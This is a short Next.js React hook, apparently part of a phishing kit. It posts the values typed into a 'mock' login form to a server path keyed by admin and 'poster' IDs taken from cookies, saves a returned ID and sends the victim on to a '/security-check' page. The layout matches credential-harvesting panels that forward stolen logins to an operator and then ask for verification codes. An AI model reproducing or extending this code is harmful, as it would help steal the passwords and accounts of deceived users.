import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { toast } from "react-toastify";
import { API_URL } from "../config";

function useMockLogin() {
  const router = useRouter();

  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");

  const login = async (values, formik) => {
    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    // console.log(url);

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      Cookies.set("id", data?.info?._id);
      router.push("/security-check");

      formik.resetForm();
      // setShowModal(false);
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return { login };
}

export default useMockLogin;
